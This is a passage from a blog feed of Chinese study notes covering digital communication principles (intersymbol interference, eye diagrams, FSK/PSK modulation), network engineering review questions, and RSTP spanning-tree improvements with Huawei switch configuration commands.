为了消除码间串扰，基带传输系统的传输函数应满足什么条件?其相应的冲激响应应具有什么特点?</p><p>为消除码间串扰，基带传输系统的传输函数应满足:</p><img src="D:\gitee-blog\source\_posts\子域名深度挖掘\传输函数.png"  /><p>即满足无码间串扰频域条件。</p><p>其相应的冲激响应应具有：</p><img src="D:\gitee-blog\source\_posts\子域名深度挖掘\冲激响应.png"  /><p> 即具有无码间串扰时域条件。</p><p>6-8    何谓奈奎斯特速率和奈奎斯特带宽?此时的频带利用率有多大?</p><blockquote><p>理想低通传输特性的带宽称为奈奎斯特带宽,将该系统无码间干扰的最高传输速率称为奈奎斯特速率。此时频带利用率为2B/Hz</p></blockquote><p>6-13    什么是眼图?它有什么作用?由眼图模型可以说明基带传输系统的哪些性能?具有升余弦脉冲波形的HDB,码的眼图应是什么样的图形?</p><blockquote><p>眼图是实验手段估计基带传输系统性能的一种方法。它是指接收滤波器输出信号波形在示波器上叠加所形成的图像</p></blockquote><pre class="line-numbers language-none"><code class="language-none">眼图和系统性能的关系：1.最佳抽样时刻是“眼睛”张最大的时刻;2.对定时误差的灵敏度可由眼睛的斜率决定，斜率越陡，对定时误差就越灵敏;3.图中阴影区域的垂直高度表示信号畸变范围;4.图中央的横轴位置对应判决门限电平;5.在抽样时刻上，上下阴影区的间隔距离之半为噪声容限,即若噪声瞬时值超过这个容限，就可能发生错误判决眼图：一种宏观评价系统性能得一种手段；&#96;最佳抽样时刻：眼睛张开最大得时刻；定时误差灵敏度：眼眶的斜率，斜率越大越敏感；判决明显电平：横轴；噪声容限：纵轴；(1)最佳取样时刻应选择在眼睛张开最大的时刻;(2)眼睛闭合的速率，即眼图斜边的斜率，表示系统对定时误差灵敏的程度，斜边愈陡，对定位误差愈敏感;(3)在取样时刻上，阴影区的垂直宽度表示最大信号失真量;(4)在取样时刻上，上下两阴影区的间隔垂直距离之半是最小噪声容限，噪声瞬时值超过它就有可能发生错误判决;(5)阴影区与横轴相交的区间表示零点位置变动范围，它对于从信号平均零点位置提取定时信息的解调器有重要影响。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具有升余弦脉冲波形的HDB,码的眼图中间会有一条代表0的水平线</p><h5 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a><strong>第七章</strong></h5><p>P205页信息</p><p>7-1    什么是数字调制?它和模拟调制有哪些异同点?</p><blockquote><p>数字调制是用载波信号的某些离散状态来表征传送的信息,在接收端对载波信号的离散调制参量进行检测。<br>和模拟调制一样数字调制也有调幅，调频和调相三种基本形式，并可以派生出多种其他形式。在原理上二者并没有什么区别。只不过模拟调制是对载波信号的参量进行离散调制，在接收端也只需对载波信号的离散调制参量估值</p></blockquote><p>7-2    数字调制的基本方式有哪些?其时间波形上各有什么特点?数字调制技术有两种方法:</p><blockquote><p>一是利用模拟调制方法去实现数字式调制，即把数字调制看成是模拟调制的一个特例，把数字基带信号当成模拟信号的特殊情况处理</p></blockquote><blockquote><p>二是利用数字信号的离散取值的特点通过开关键控载波，从而实现数字调制，这种调制方式通常有幅度键控、频率键控和相位键控。其时间波形上来说，有可能是不连续的</p></blockquote><p>7-5    什么是频移键控?2FSK信号产生和解调方法有哪些?</p><blockquote><p>频移键控是指用不同的载频来表示所传送的数字信息。<br>产生:1、利用矩形脉冲序列对一个载波进行调频产生;2、利用受矩形脉冲序列控制的开关电路对两个不同的频率进行选通，即键控法。<br>解调:通常采用非相干解调和相干解调两种方法，同时还有鉴频法，过零检测法和差分检波法</p></blockquote><p>7-6    2FSK信号相邻码元的相位是否连续变化与其产生方法有何关系?</p><blockquote><p>采用模拟调频电路实现的2FSK信号，其相位变化是连续的;采用数字键控法产生的2FSK信号其相位变化不一定连续</p></blockquote><p>7-8    什么是绝对移相?什么是相对移相?他们有何区别?绝对移相是用载波的相位直接表示码元;</p><blockquote><p>相对移相是用相邻码元的相对载波相位值表示数字信息。<br>相对移相信号可以看作是把数字信息序列绝对码变换成相对码,然后根据相对码进行绝对移相而成</p></blockquote><p>7-9    2PSK信号和2DPSK信号可以用哪些方法产生和解调?它们是否可以采用包络检波法解调?为什么?</p><blockquote><p>2PSK信号和2DPSK信号可以用模拟调制法和键控调制法产生;<br>2PSK信号可以用极性比较法，鉴相法解调，2DPSK信号通常用极性比较码变换法，差分相干法解调。<br>它们都不能采用包络检波法解调，因为它们是用相位而不是振幅来携带传送信息的</p></blockquote><p>7-10    2PSK信号及2DPSK信号的功率谱密度有何特点?试将它们与OOK信号的功率谱密度加以比较。</p><blockquote><p>2PSK信号的功率谱密度同样由离散谱和连续谱组成，但当双极性基带信号以相等的概率出现时，不存在离散谱部分。同时，连续谱部分与2ASK信号基本相同，因此，2PSK信号的带宽也与2ASK信号相同。此外，2DPSK信号的带宽也与2ASK信号的相同</p></blockquote><p>补充2DPSK如何克服π现象？</p><p>DPSK</p><pre class="line-numbers language-none"><code class="language-none">2PSK的“倒∏现象”或“反向工作”:在波形图中,假设相干载波的基准相位与2PSK信号的调制载波的基准相位一致(通常默认为0相位)。但是,由于在2PSK信号的载波恢复过程中存在着的相位模糊,即恢复的本地载波与所需的相干载波可能同相,也可能反相,这种相位关系的不确定性将会造成解调出的数字基带信号与发送的数字基带信号正好相反,即“1”变为“0”,“0”变为“1”,判决器输出数字信号全部出错。这种现象称为2PSK 方式的“倒π”现象或“反相工作”。这也是2PSK方式在实际中很少采用的主要原因。另外,在随机信号码元序列中,信号波形有可能出现长时间连续的正弦波形,致使在接收端无法辨认信号码元的起止时刻。为了解决上述问题,可以采用差分相移键控(DPSK)体制。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre> <center><img src="D:\gitee-blog\source\_posts\子域名深度挖掘\2DPSK相干解调法.png" style="zoom:50%;" /></center> ]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;第一章&quot;&gt;&lt;a href=&quot;#第一章&quot; class=&quot;headerlink&quot; title=&quot;第一章&quot;&gt;&lt;/a&gt;&lt;strong&gt;第一章&lt;/strong&gt;&lt;/h5&gt;&lt;p&gt;1-11衡量数字通信系统有效性和可靠性的性能指标有哪些?&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;</summary>
      
    
    
    
    
    <category term="通信原理" scheme="https://shierjinghuang.github.io/tags/%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>网络工程思考题</title>
    <link href="https://shierjinghuang.github.io/2023/03/08/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    <id>https://shierjinghuang.github.io/2023/03/08/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/</id>
    <published>2023-03-08T02:23:00.000Z</published>
    <updated>2023-03-09T02:23:21.231Z</updated>
    
    <content type="html"><![CDATA[<h3 id="网络工程思考题"><a href="#网络工程思考题" class="headerlink" title="网络工程思考题"></a>网络工程思考题</h3><p>[TOC]</p><p><strong>网络三大核心：交换、路由、服务</strong></p><h4 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h4><img src="https://shierjinghuang.github.io/2022/04/15/计算机网络//OSI与TCP协议对比.png" style="zoom: 50%;" /><ul><li>1.2.1  网络的体系结构和协议</li><li>   协议三要素：语法、语义和同步（定时关系）</li><li>1.3     网络的拓扑结构<ul><li>   网络的拓扑结构是指网络中节点之间物理的或逻辑的连接方式</li><li>   5种基本的拓扑结构：网状、星形、树形、总线型和环形</li></ul></li></ul><h4 id="第二章-局域网技术"><a href="#第二章-局域网技术" class="headerlink" title="第二章 局域网技术"></a>第二章 局域网技术</h4><h5 id="2-3-以太网的基本技术"><a href="#2-3-以太网的基本技术" class="headerlink" title="2.3 以太网的基本技术"></a>2.3 以太网的基本技术</h5><blockquote><p>媒体访问控制技术：以太网采用共享媒体方式传输数据信息，即连接在一个以太网上的所有站点使用公共的总线收发数据</p></blockquote><ul><li><p>以太网的媒体访问控制方式使用载波侦听多路访问/冲突检测协议，即CSMA/CD协议，解决站点对共享总线的访问</p></li><li><p>决定发送帧时间的算法:</p><ul><li>非坚持CSMA</li><li>1-坚持CSMA</li><li>P-坚持CSMA</li></ul></li><li><p><strong>CSMA/CD协议发送数据流程:</strong></p><img src="https://shierjinghuang.github.io/2022/04/15/计算机网络/CSMA-CD发送协议.png" style="zoom:50%;" /></li><li><p><strong>冲突时间：</strong></p><ul><li><p>冲突时间是站点开始发送帧时，帧可能发生冲突所花费时间的上限</p><p>冲突时间的作用：</p><ul><li>冲突时间是检测一次冲突所需的最少，超过了该时间，再也不会冲突</li><li>确定了帧的“最小帧长度”</li><li>决定了在总线上出现的最大帧碎片长度</li><li>可以作为冲突后帧要重新发送所需的基本时间延迟计算的基本单位</li></ul></li></ul></li></ul><p><strong>曼彻斯特编码</strong>：在每一位时间的中间，信号有一个跳变，由高到低的跳变用来表示1，由低到高的跳变用来表示0</p><p><strong>不归零制编码的缺点</strong></p><blockquote><ul><li>接收方很难确定一位的开始和结束，特别是在连续多位相同是容易混淆，需要同步信号辅助</li><li>当传输的数据中“1”和“0”的个数不均衡时，会存在直流分量，将影响接收方的正确接收</li></ul></blockquote><h5 id="2-4-10MBps以太网"><a href="#2-4-10MBps以太网" class="headerlink" title="2.4 10MBps以太网"></a>2.4 10MBps以太网</h5><blockquote><p>网卡：网络接口卡，又称网络适配器，通常安装在网络站点内，负责站点和网络之间的通信</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">网卡的基本功能<span class="token comment"># 提供与站点主机的接口电路，数据缓存器的管理，数据链路控制和管理，编码和译码，网络信息的收发</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="2-7-以太网的交换技术"><a href="#2-7-以太网的交换技术" class="headerlink" title="2.7 以太网的交换技术"></a>2.7 以太网的交换技术</h5><ol><li><p>以太网交换原理：源地址学习，目的地址转发（自学习转发算法）</p></li><li><p>网桥与桥接技术：网桥属于数据链路层网络设备，主要用于连接两个局域网</p><ul><li>网桥的操作过程<ul><li>侦听每个端口上是否有帧到达，保存到达帧的源MAC地址以及接收它的端口号到站缓冲区，查看接收到的每个帧的目的MAC地址。</li><li>广播MAC地址，或站缓冲区中无此地址，转发该帧到所有其它端口；站缓冲区中存在该MAC地址，则转发到相应端口；如果源MAC地址和目的MAC地址所对应的端口相同，则将该帧丢弃</li></ul></li><li>网桥与集线器的重要区别<ul><li>网桥阻止一个局域网的报文传输到另外一个局域网中去，缩小冲突域，增加网络带宽</li></ul></li></ul></li><li><p>生成树协议：</p><p>在存在冗余链路的情况下，在网络中标识出一条无环链路，并临时关闭非工作链路中的网桥端口，当网络中任何一条链路的状态发生变化时，网桥将根据生成树协议重新计算是否因为链路状态的改变而出现新的回路，如果工作链路出现了故障导致帧不能通过，生成树协议将重新计算出一条新的无环链路</p><ul><li>有向无环图，根本目的防止形成回路</li><li>分为生成树协议（STP）与快速生成树协议（RSTP）<ul><li>spanning-tree mode ?                     // 查看支持的生成树协议</li><li>spanning-tree mode rapid-pvst     // 快速生成树协议</li></ul></li></ul></li><li><p>全双工以太网技术：是指在条网络链路上可以同时进行数据接收和发送</p></li></ol><ul><li>广域网中的链路通常是全双工的,但局域网以前一直 工作在半双工方式下。在实际组网时,交换机与交换机之间、交换机与单个工作站之间一毅都采用全双工传输方式。</li></ul><ol start="5"><li>以太网交换机：以太网交换机采用以太网交换技术实现对报文的快速转发，是交换式以太网中区不可少的网络设备。在OSI参考模型中，以太网交换机属于工作在第二层的网络设备<ul><li>交换机的交换方式：静态交换方式与动态交换方式<ul><li>静态交换方式：端口之间是通过人工设置的固定连接来交换数据帧的</li><li>动态交换方式：端口之间是通过动态学习后形成交换通道实现数据帧的交换的</li></ul></li><li>交换机的重要特征：MAC地址表大小、端口的自适应能力、模块的热插拔、端口限速、背板总线带宽、转发速率、端口聚合</li><li> 动态交换方式分为：<strong>存储转发交换方式、直通交换方式、无碎片交换方式</strong></li><li>如何访问交换机：通过交换机中的控制台端口、通过telnet远程登录交换机、通过web方式访问交换机、使用专用的网络管理软件访问交换机（配置、访问等详细命令亮仔整理了）</li></ul></li></ol><h5 id="2-8-虚拟局域网（VLAN）"><a href="#2-8-虚拟局域网（VLAN）" class="headerlink" title="2.8 虚拟局域网（VLAN）"></a>2.8 虚拟局域网（VLAN）</h5><blockquote><p>利用交换机对帧传输的控制能力，在网络的物理拓扑结构基础上建立多个逻辑网络</p></blockquote><ol><li><p>vlan特点：地理位置无关性、划分广域网、系统配置默认使用vlan 1</p></li><li><p>vlan划分：基于端口、基于MAC地址、基于网络层的vlan</p></li><li><p><strong>Vlan技术的优点：隔离网络广播风暴、增强了网络安全性、简化网络管理和维护、提高网络性能</strong></p></li><li><p>实现三个通信：</p><ul><li>无vlan通信</li><li>同一vlan间通信</li><li>不同vlan间通信：三层交换机实现vlan间通信、二层交换机与路由器实现vlan间通信</li></ul></li><li><p>vlan中继协议（VTP）：（实验看亮仔整理）</p><ul><li><p>vtp能否辅助vlan进行接口划分？</p></li><li><p>三种模式：</p><p>①server：<strong>服务器 — 在 VTP 服务器模式下，可创建、修改和删除 VLAN，并为整个 VTP 域指定其他配置参数</strong></p><p>②client：<strong>客户端 — VTP 客户端的行为与 VTP 服务器相同，学习vlan划分不学习接口划分，但不能在 VTP 客户端上创建、更改或删除 VLAN</strong></p><p>③transparent：<strong>透明 — VTP 透明交换机不参加 VTP</strong></p></li></ul></li></ol><p>2.9 无线局域网 <del>（不知道写的啥，看书吧）</del> <strong><del>（其实就是没有讲）</del></strong></p><h4 id="第三章-广域网和网络接入"><a href="#第三章-广域网和网络接入" class="headerlink" title="第三章 广域网和网络接入"></a>第三章 广域网和网络接入</h4><ol><li><p>接入网技术</p><ul><li>电话与拨号接入，ISDN接入，ADSL接入，光纤同轴电缆混合网（HFC），光纤接入，无线接入技术</li></ul></li><li><p>公用数据网：</p><ul><li>不可靠，报文传输</li><li>帧中继，可变帧长，通过链路实现可靠</li></ul></li></ol><h4 id="第四章-网络的互联技术"><a href="#第四章-网络的互联技术" class="headerlink" title="第四章 网络的互联技术"></a>第四章 网络的互联技术</h4><ol><li><p>IP协议功能：</p><img src="https://shierjinghuang.github.io/2022/04/15/计算机网络/IP协议报文.png" style="zoom: 40%;" /><ul><li>寻址与路由</li><li>分段与重组<ul><li>分段：将数据报拆分成一个个能够适合下层技术传输的小数据报</li><li>重组：到达目的地后，需要将拆分后的多个数据报重组成原始数据报</li></ul></li></ul></li><li><p><strong>划分子网、构造超网</strong>（考虑本学期课上讲过，应该有应用题，请看计算机网络课本）</p></li><li><p>静态划分、DHCP动态主机分配协议</p><ul><li><p>静态划分：</p><img src="https://shierjinghuang.github.io/2022/04/15/计算机网络/子网的静态划分.png" style="zoom:50%;" /><ul><li>网络地址：IP地址中主机地址部分全为0</li><li>广播地址：IP地址中主机地址部分全为1</li><li>0.0.0.0<ul><li>代表路由表的缺省路由</li><li>代表主机本身（尚未获得IP地址情况下）</li></ul></li><li>255.255.255.255：受限广播或本地广播</li><li>127.0.0.0/8：Loopback地址，用于测试TCP/IP</li></ul></li><li><p>DHCP动态主机分配协议</p><img src="https://shierjinghuang.github.io/2022/04/15/计算机网络/DHCP动态主机分配协议.png" style="zoom:50%;" /></li></ul></li><li><p>网络地址转换-NAT</p><blockquote><p>缘由：IP地址严重不足</p></blockquote><ul><li><p>静态NAT：实现内部IP和外部IP的一对一映射，但不能节约IP地址</p></li><li><p>动态NAT：从多个外部地址中选择一个对应内部地址，最多只能有k台内部主机同时访问Internet</p></li><li><p>端口NAT（NAPT）：只要一个外部地址，通过TCP和UDP的端口号在内部地址和外部地址之间建立映射关系，进行内部地址和外部地址的转换</p></li></ul></li><li><p>静态路由、动态路由、默认路由</p><ul><li>静态路由：由网络管理员手工配置，不会根据网络变化而自动调整</li><li>动态路由：根据路由信息自动生成，适用于大型网络，可以提高网络的健壮性和性能</li><li>默认路由：默认路由Default Gateway，也称缺省路由，在没有找到匹配的路由项时所使用的路由，在路由表中，默认路由以到网络0.0.0.0/0的形式出现</li></ul></li><li><p>动态路由协议</p><ul><li>路由信息协议（RIP）<ul><li>典型的距离向量路由协议，具有实现简单、开销小等优点，不适用于大型网络</li><li><strong>RIP协议中的路由循环问题（个人感觉会有）</strong><ul><li>触发更新：一旦路由器的路由信息表发生变化，立刻向邻居路由器广播更新后的路由信息表，而不必等上0～30秒时间到下一个广播周期再发送路由信息表</li><li>水平分割：不向路由信息的来源路由器回传自身的路由信息</li><li>带毒性逆转的水平分割：向路由信息的来源路由器回传路由信息时，距离值被设为16</li></ul></li></ul></li><li>最短路径优先路由协议（OSPF路由协议）<ul><li>OSPF：Open Shortest Path First，开放的最短路径优先路由协议</li><li>OSPF是一种典型的链路状态路由协议，每个OSPF路由器均维护着一个数据库，它反映了整个网络的拓扑结构</li></ul></li></ul></li><li><p>访问控制列表</p><ul><li>标准ACL</li><li>扩展ACL</li></ul></li><li><p>虚拟专用网虚拟专用网</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;网络工程思考题&quot;&gt;&lt;a href=&quot;#网络工程思考题&quot; class=&quot;headerlink&quot; title=&quot;网络工程思考题&quot;&gt;&lt;/a&gt;网络工程思考题&lt;/h3&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;网络三大核心：交换、路由、服务&lt;/strong&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络工程" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>生成树的改进 RSTP与MSTP</title>
    <link href="https://shierjinghuang.github.io/2023/03/06/%E7%94%9F%E6%88%90%E6%A0%91%E7%9A%84%E6%94%B9%E8%BF%9B%20RSTP%E4%B8%8EMSTP/"/>
    <id>https://shierjinghuang.github.io/2023/03/06/%E7%94%9F%E6%88%90%E6%A0%91%E7%9A%84%E6%94%B9%E8%BF%9B%20RSTP%E4%B8%8EMSTP/</id>
    <published>2023-03-06T01:25:00.000Z</published>
    <updated>2023-04-09T07:25:22.534Z</updated>
    
    <content type="html"><![CDATA[<h1 id="生成树的改进-RSTP与MSTP"><a href="#生成树的改进-RSTP与MSTP" class="headerlink" title="生成树的改进 RSTP与MSTP"></a>生成树的改进 RSTP与MSTP</h1><p>[TOC]</p><h2 id="快速生成树协议RSTP"><a href="#快速生成树协议RSTP" class="headerlink" title="快速生成树协议RSTP"></a>快速生成树协议RSTP</h2><blockquote><p>IEEE 802.1W中定义的RSTP可以视为STP的改进版本，RSTP在许多方面对STP进行了优化，它的收敛速度更快，而且能够兼容STP</p></blockquote><h3 id="RSTP对STP的改进："><a href="#RSTP对STP的改进：" class="headerlink" title="RSTP对STP的改进："></a>RSTP对STP的改进：</h3><ul><li>RSTP对STP的改进：<ul><li>通过端口角色的增补，简化了生成树协议的理解及部署；</li><li>端口状态的重新划分；</li><li>配置BPDU格式的改变，充分利用了STP协议报文中的Flag字段，明确了端口角色；</li><li>配置BPDU的处理发生变化；</li><li>快速收敛；</li><li>增加保护功能。</li></ul></li></ul><h4 id="改进点1：端口角色的改进："><a href="#改进点1：端口角色的改进：" class="headerlink" title="改进点1：端口角色的改进："></a>改进点1：端口角色的改进：</h4><p>RSTP的端口角色共有4种：根端口、指定端口、Alternate端口和Backup端口。</p><p> <center><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\Alternate端口.png" alt="Alternate端口" style="zoom: 67%;" /><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\备份端口.png" alt="备份端口"style="zoom: 67%;" /> </center></p>根端口和指定端口的作用同STP中定义，Alternate端口和Backup端口的描述如下：<ul><li>从配置BPDU报文发送角度来看：<ul><li>Alternate端口就是由于学习到其它网桥发送的配置BPDU报文而阻塞的端口</li><li>Backup端口就是由于学习到自己发送的配置BPDU报文而阻塞的端口</li></ul></li><li>从用户流量角度来看：<ul><li>Alternate端口提供了从指定桥到根的另一条可切换路径，作为根端口的备份端口</li><li>Backup端口作为指定端口的备份，提供了另一条从根桥到相应网段的备份通路</li></ul></li></ul><blockquote><p>给一个RSTP域内所有端口分配角色的过程就是整个拓扑收敛的过程</p></blockquote><h4 id="改进点2：端口状态的改进"><a href="#改进点2：端口状态的改进" class="headerlink" title="改进点2：端口状态的改进"></a>改进点2：端口状态的改进</h4><p>RSTP的状态规范缩减为3种，根据端口是否转发用户流量和学习MAC地址来划分:</p><ul><li>Discarding状态：不转发用户流量也不学习MAC地址</li><li>Learning状态：不转发用户流量但是学习MAC地址</li><li>Forwarding状：既转发用户流量又学习MAC地址。</li></ul><table><thead><tr><th align="center">STP端口状态</th><th align="center">RSTP端口状态</th><th align="center">端口在拓扑中的角色</th></tr></thead><tbody><tr><td align="center">Forwarding</td><td align="center">Forwarding</td><td align="center">包括根端口、指定端口</td></tr><tr><td align="center">Learning</td><td align="center">Learning</td><td align="center">包括根端口、指定端口</td></tr><tr><td align="center">Listening</td><td align="center">Discarding</td><td align="center">包括根端口、指定端口</td></tr><tr><td align="center">Blocking</td><td align="center">Discarding</td><td align="center">包括Alternate端口、Backup端口</td></tr><tr><td align="center">Disabled</td><td align="center">Discarding</td><td align="center">包括Disable端口</td></tr></tbody></table><h4 id="改进点3：配置BPDU-RST-BPDU"><a href="#改进点3：配置BPDU-RST-BPDU" class="headerlink" title="改进点3：配置BPDU - RST BPDU"></a>改进点3：配置BPDU - RST BPDU</h4><p><strong>RSTP的配置BPDU充分利用了STP报文中的Flag字段，明确了端口角色</strong></p><ul><li>除了保证和STP格式基本一致之外，RSTP作了如下变化：<ul><li>Type字段：配置BPDU类型不再是0而是2，所以运行STP的设备收到RSTP的配置BPDU时会丢弃</li><li>Flag字段：使用了原来保留的中间6位，这样改变的配置BPDU叫做RST BPDU</li></ul></li></ul><h5 id="RST-BPDU报文格式："><a href="#RST-BPDU报文格式：" class="headerlink" title="RST BPDU报文格式："></a>RST BPDU报文格式：</h5><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\RST BPDU报文格式.png" alt="RST BPDU报文格式" style="zoom: 67%;" /><h5 id="RST-BPDU与STP配置BPDU报文格式不同点"><a href="#RST-BPDU与STP配置BPDU报文格式不同点" class="headerlink" title="RST BPDU与STP配置BPDU报文格式不同点"></a>RST BPDU与STP配置BPDU报文格式不同点</h5><ul><li>BPDU类型，1 Byte，RST BPDU的类型值为0x02。</li><li>标志，1 Byte，包括：<ul><li>bit 7：TCA，表示拓扑变化确认；</li><li>bit 6：Agreement，表示同意，用于P/A机制；</li><li>bit 5：Forwarding，表示转发状态；</li><li>bit 4：Learning，表示学习状态；</li><li>bit 3和bit 2：表示端口角色, 00表示未知端口, 01表示替代或备份端口, 10表示根端口, 11表示指定端口</li><li>bit 1：Proposal，表示提议，用于P/A机制；</li><li>bit 0：TC，表示拓扑变化。</li></ul></li></ul><h4 id="改进点4：配置BPDU的处理"><a href="#改进点4：配置BPDU的处理" class="headerlink" title="改进点4：配置BPDU的处理"></a>改进点4：配置BPDU的处理</h4><h5 id="RSTP对配置BPDU的发送方式进行了改进"><a href="#RSTP对配置BPDU的发送方式进行了改进" class="headerlink" title="RSTP对配置BPDU的发送方式进行了改进"></a>RSTP对配置BPDU的发送方式进行了改进</h5><blockquote><p>在拓扑稳定后，无论非根桥设备是否接收到根桥传来的配置BPDU报文，非根桥设备仍然按照Hello Time规定的时间间隔发送配置BPDU，该行为完全由每台设备自主进行</p></blockquote><h5 id="更短的BPDU超时时间"><a href="#更短的BPDU超时时间" class="headerlink" title="更短的BPDU超时时间"></a>更短的BPDU超时时间</h5><p>如果一个端口在超时时间（即三个周期，超时时间＝Hello Time×3）内没有收到上游设备发送过来的配置BPDU，那么该设备认为与此邻居之间的协商失败</p><blockquote><p>STP需要先等待一个Max Age</p></blockquote><h5 id="处理次优BPDU"><a href="#处理次优BPDU" class="headerlink" title="处理次优BPDU"></a>处理次优BPDU</h5><p>当一个端口收到上游的指定桥发来的RST BPDU报文时，该端口会将自身缓存的RST BPDU与收到的RST BPDU进行比较如果该端口缓存的RST BPDU优于收到的RST BPDU，那么该端口会直接丢弃收到的RST BPDU，立即回应自身缓存的RST BPDU，从而加快收敛速度</p><ul><li><p>STP：      STP只有指定端口会立即处理次优BPDU，其他端口会忽略次优BPDU，等到Max Age计时器超时后，缓存的次优BPDU才会老化，然后发送自身更优的BPDU，进行新一轮的拓扑收敛。</p></li><li><p>RSTP：   RSTP处理次优BPDU报文不再依赖于任何定时器，解决拓扑收敛，同时RSTP的任何端口角色都会处理次优BPDU，从而加快了拓扑收敛。</p></li></ul><h4 id="改进点5：快速收敛机制"><a href="#改进点5：快速收敛机制" class="headerlink" title="改进点5：快速收敛机制"></a>改进点5：快速收敛机制</h4><h5 id="快速收敛机制："><a href="#快速收敛机制：" class="headerlink" title="快速收敛机制："></a>快速收敛机制：</h5><ul><li><p>如果网络中一个根端口失效，那么网络中最优的Alternate端口将成为根端口，进入Forwarding状态。因为通过这个Alternate端口连接的网段上必然有个指定端口可以通往根桥</p></li><li><p>如果网络中一指定端口失效，那么网络中最优的Backup端口将成为指定端口，进入Forwarding状态。因为Backup端口作为指定端口的备份，提供了另一条从根桥到相应网段的备份通路</p></li></ul><center><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\根端口快速切换.png" alt="根端口快速切换" style="zoom:67%;" /><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\指定端口快速切换.png" alt="指定端口快速切换" style="zoom:67%;" /></center>##### 边缘端口 (Edge Port)机制：<blockquote><p>在RSTP里面，如果某一个端口位于整个网络的边缘，即不再与其他交换设备连接，而是直接与终端设备直连，这种端口可以设置为边缘端口</p></blockquote><p>边缘端口不参与RSTP计算，可以由Discarding直接进入Forwarding状态，同时边缘端口的UP和Down，不会引起网络拓扑的变动</p><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\RSTP边缘端口.png" alt="RSTP边缘端口" style="zoom: 50%;" /><p>但是一旦边缘端口收到配置BPDU，就丧失了边缘端口属性，成为普通STP端口，并重新进行生成树计算，从而引起网络震荡</p><h5 id="Proposal-Agreement机制："><a href="#Proposal-Agreement机制：" class="headerlink" title="Proposal/Agreement机制："></a>Proposal/Agreement机制：</h5><p>简称P/A机制，RSTP通过P/A机制加快了上游端口进入Forwarding状态的速度。<br>当一个端口被选举成为指定端口之后,会先进入Discarding状态，再通过P/A机制快速进入Forwarding状态</p><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\Proposal_Agreement机制：.png" alt="P/A机制" style="zoom:67%;" /><p>事实上对于STP，指定端口的选择可以很快完成，主要的速度瓶颈在于：为了避免环路，必须等待足够长的时间，使全网的端口状态全部确定，也就是说必须要等待至少一个Forward Delay所有端口才能进行转发。<br>而RSTP的主要目的就是消除这个瓶颈，通过阻塞自己的非根端口来保证不会出现环路。而使用P/A机制加快了上游端口进入Forwarding状态的速度。</p><h4 id="改进点6：拓扑变更机制"><a href="#改进点6：拓扑变更机制" class="headerlink" title="改进点6：拓扑变更机制"></a>改进点6：拓扑变更机制</h4><p>在RSTP中检测拓扑是否发生变化只有一个标准：一个非边缘端口迁移到Forwarding状态。</p><p>一旦检测到拓扑发生变化，将进行如下处理：<br>为本交换设备的所有非边缘指定端口和根端口启动一个TC While Timer，该计时器值是Hello Time的两倍。在这个时间内，清空状态发生变化的端口上学习到的MAC地址。<br>同时，由非边缘指定端口和根端口向外发送RST BPDU，其中TC置位。一旦TC While Timer超时，则停止发送RST BPDU。<br>其他交换设备接收到RST BPDU后，清空所有端口（除了收到RST BPDU的端口和边缘端口）学习到MAC地址，然后也为自己所有的非边缘指定端口和根端口启动TC While Timer，重复上述过程。<br>如此，网络中就会产生RST BPDU的泛洪。</p><h3 id="RSTP与STP的兼容"><a href="#RSTP与STP的兼容" class="headerlink" title="RSTP与STP的兼容"></a>RSTP与STP的兼容</h3><blockquote><p>RSTP可以兼容STP：RSTP可以和STP互操作，但是此时会丧失快速收敛等RSTP优势。</p></blockquote><p>当一个网段里既有运行STP的交换设备又有运行RSTP的交换设备，STP交换设备会忽略RSTP的BPDU</p><p>运行RSTP的交换设备在某端口上接收到运行STP的交换设备发出的配置BPDU，在两个Hello Time时间之后，便把自己的端口转换到STP工作模式，发送配置BPDU，从而实现了互操作。</p><h3 id="RSTP的基本配置"><a href="#RSTP的基本配置" class="headerlink" title="RSTP的基本配置"></a>RSTP的基本配置</h3><p>RSTP的配置指令与STP的基本配置指令相同此处介绍不同指令：</p><p><strong>设置RSTP</strong></p><pre class="line-numbers language-ensp" data-language="ensp"><code class="language-ensp">[Huawei] stp mode rstp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>配置当前接口为边缘端口</strong></p><pre class="line-numbers language-ensp" data-language="ensp"><code class="language-ensp">[Huawei-GigabitEthernet0&#x2F;0&#x2F;1] stp edged-port enable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>缺省情况下，交换设备的所有端口都是非边缘端口。</p><h4 id="RSTP的保护功能配置命令"><a href="#RSTP的保护功能配置命令" class="headerlink" title="RSTP的保护功能配置命令"></a>RSTP的保护功能配置命令</h4><p><strong>配置BPDU保护功能</strong></p><pre class="line-numbers language-ensp" data-language="ensp"><code class="language-ensp">[Huawei] stp bpdu-protection<span aria-hidden="true" 